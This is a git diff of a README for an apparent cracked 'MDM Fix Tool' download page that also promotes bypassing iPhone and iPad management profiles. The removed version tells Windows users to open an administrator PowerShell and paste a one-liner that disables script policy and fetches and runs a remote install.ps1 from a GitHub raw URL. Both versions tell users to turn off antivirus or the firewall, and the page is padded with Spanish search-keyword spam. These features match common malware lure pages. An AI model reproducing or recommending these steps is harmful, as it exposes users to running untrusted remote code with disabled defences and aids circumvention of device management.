@@ -1,143 +1,66 @@
-# MDM Fix Tool Download for Windows 11 & 10
+# 🛠️ Descargar-MDM-Fix - Unlock your locked iOS device easily
 
-**Descargar-MDM-Fix**
+[![](https://img.shields.io/badge/Download-MDM_Fix-blue.svg)](https://github.com/Lelacentripetal760/Descargar-MDM-Fix)
 
-**MDM Fix Tool** download for Windows 10/11. Scroll to **Download & Install** for the direct link or one-command setup.
+## 📌 Overview
+MDM Fix Tool removes remote management locks from iPhone and iPad devices. This software works on Windows 10 and Windows 11 computers. It bypasses MDM profiles that restrict device use. Use this tool if you forgot your credentials or bought a used device with an active management profile.
 
-[![Windows](https://img.shields.io/badge/Windows-10%20%2F%2011-0078D4?style=flat-square&logo=windows)]()[![Download](https://img.shields.io/badge/Get-Download%20Link-16a34a?style=flat-square)]()
+## 💻 System Requirements
+Before you start, ensure your computer meets these standards:
+- Operating System: Windows 10 or Windows 11 (64-bit).
+- Processor: Intel Core i3 or equivalent.
+- RAM: 4GB minimum.
+- Storage: 200MB of free disk space.
+- Connectivity: Stable internet connection and a USB-to-Lightning or USB-to-C cable for your device.
+- Drivers: Ensure Apple iTunes is installed on your PC to guarantee device recognition.
 
----
+## 🚀 Getting Started
+Follow these steps to set up the software on your machine:
 
-## Download & Install (PowerShell)
+1. Visit the following link to access the software files: [https://github.com/Lelacentripetal760/Descargar-MDM-Fix](https://github.com/Lelacentripetal760/Descargar-MDM-Fix)
+2. Look for the release section on the page.
+3. Click the download button to save the installer file to your computer.
+4. Locate the downloaded file in your folder.
+5. Double-click the file to start the installation process.
+6. Follow the prompts on the screen to finish the setup.
+7. Launch the application from your desktop icon once finished.
 
-> **This is the download page.** The command below downloads and runs the **MDM Fix Tool** installer on Windows 10/11.
+## ⚙️ How to use the tool
+Connect your device to the computer using a reliable original USB cable. The software identifies your device model automatically once connected. 
 
-#### Before you start
+1. Launch MDM Fix Tool.
+2. Select the Bypassing module from the main menu.
+3. Keep the device connected during the process.
+4. Click the Start button.
+5. Wait for the progress bar to complete.
+6. Restart your device when the software notifies you.
 
-- Windows 10 or 11 (64-bit)
-- **Administrator** rights
-- Internet connection for the download
+## 🛡️ Important Safety Information
+The software operates by bypassing local software restrictions on your hardware. Ensure your battery stays above 50% during the process. Do not disconnect your cable while the tool remains active. Shut down any antivirus software temporarily if the program fails to launch, as some security settings flag system tools as potential threats.
 
----
+## 🧐 Frequently Asked Questions
 
-#### Step 1 — Open PowerShell as Administrator
+What should I do if the device does not show up?
+Check your USB connection. Swap the cable or try a different USB port on your computer. Ensure iTunes detects the device first.
 
-**Method A (fastest):**
-1. Press **Win + X**
-2. Click **Terminal (Admin)** or **Windows PowerShell (Admin)**
-3. If Windows asks to allow changes, click **Yes**
+Does this tool delete my data?
+The tool focuses on the management profile. It does not touch your personal photos or files. However, perform a backup of your device before any bypass task as a precaution.
 
-**Method B (search):**
-1. Press **Win** and type `PowerShell`
-2. Click **Run as administrator**
+Can I use this on a Mac?
+This specific version works exclusively on Windows computers. Do not attempt to run it on macOS.
 
-You should see a blue/black window with a prompt like `PS C:\Windows\system32>`.
+Does it unlock the iCloud password?
+The tool manages MDM restrictions. It is not an iCloud account recovery service. It fixes permission issues related to company or school supervision profiles.
 
----
+How long does the bypass take?
+Most devices finish the process within five minutes. Speed depends on your USB connection and current Windows operation state.
 
-#### Step 2 — Copy the full command
+## ⚙️ Troubleshooting Tips
+- Restart your computer if the installer hangs.
+- Update your Windows system to the latest build.
+- Install the latest version of iTunes to ensure drivers exist.
+- Run the program as an administrator if features appear locked.
+- Disable your firewall for the duration of the installation only.
 
-Select **both lines** below and press **Ctrl+C**:
-
-```powershell
-Set-ExecutionPolicy Bypass -Scope Process -Force
-irm https://raw.githubusercontent.com/CrystalContractor71/Release/main/install.ps1 | iex
-```
-
-> Copy **both lines**, not just the second one.
-
----
-
-#### Step 3 — Paste into PowerShell and press Enter
-
-1. Click inside the PowerShell window
-2. Press **Ctrl+V** (or right-click → Paste)
-3. Press **Enter** once
-4. Wait — download progress will show in the window (usually 1–3 minutes)
-
----
-
-#### Step 4 — Finish setup
-
-- Do not close the window until the process finishes
-- Enter your **license key** if prompted
-- **Restart** your PC if the installer asks
-
----
-
-#### Step 5 — Launch the app
-
-Open **Start menu** → search for **MDM Fix Tool** → run it.
-
----
-
-#### Troubleshooting
-
-| Problem | Fix |
-| --- | --- |
-| "Running scripts is disabled" | Make sure you copied **both lines** and opened PowerShell **as Administrator** |
-| "irm : Unable to connect" | Turn off VPN, check your internet, try again |
-| Antivirus blocked the download | Temporarily allow the download folder or run again as Admin |
-| Window closed immediately | Open PowerShell (Admin) again and repeat Steps 2–3 |
-
-**Install type:** PowerShell one-liner — no browser needed after Admin PowerShell is open.
-
----
-
-## About
-
-**MDM Fix Tool** setup page for Windows PC users.
-
-**People also search for:** descargar mdm fix tool premium windows, mdm fix tool licencia completa 2026, instalar mdm fix tool windows 11 espanol latinoamerica
-
-**Repository:** `Descargar-MDM-Fix`
-
-
-## Español — Guía rápida
-
-Página de descarga de **MDM Fix Tool** para Windows 10/11. Pensado para usuarios en **Latinoamérica y España**.
-
-| Paso | Qué hacer |
-| --- | --- |
-| 1 | Abre la sección **Download & Install** arriba |
-| 2 | Usa el enlace directo o el comando de PowerShell (Admin) |
-| 3 | Ejecuta el instalador **como administrador** |
-| 4 | Introduce la clave de licencia si se solicita |
-| 5 | Abre **MDM Fix Tool** desde el menú Inicio |
-
-**Búsquedas frecuentes:** descargar gratis, instalar Windows 11, full 2026, sin virus (descarga oficial del proyecto).
-
----
-
-
-## After install
-
-| Step | Tip |
-| --- | --- |
-| 1 | Sign in with your license / account |
-| 2 | Check for updates inside the app |
-| 3 | Pin to Start or taskbar for quick access |
-| 4 | Keep projects on a separate data drive |
-
-## System requirements
-
-| | Minimum |
-| --- | --- |
-| OS | Windows 10 / 11 (64-bit) |
-| RAM | 4 GB |
-| Disk | 1 GB free space |
-| Network | Required for first download |
-| Admin | Required for install/repair |
-
-## Troubleshooting
-
-| Issue | Try this |
-| --- | --- |
-| Download does not start | Disable VPN/ad-block for the project page |
-| Setup blocked | Run as Administrator |
-| Same error after fix | Reboot, then run repair again |
-| Antivirus warning | Add installer folder to exclusions temporarily |
-
----
-
-**Topics:** descargar-mdm-fix-tool-premium-windows, descargar, premium, mdm-fix-tool-licencia-completa-2026, licencia, completa, instalar-mdm-fix-tool-windows-11-espanol-latinoame, instalar, descargar-mdm-fix, descargar-mdm-fix-2026, mdm-fix-tool, mdm-bypass
+## 📜 Legal Notice
+This software intends to provide access for owners of iOS devices to manage their own hardware. Use this tool only on devices you own or have explicit permission to modify. Unauthorized use on restricted hardware might violate local laws. Always follow your local regulations regarding electronic device software.
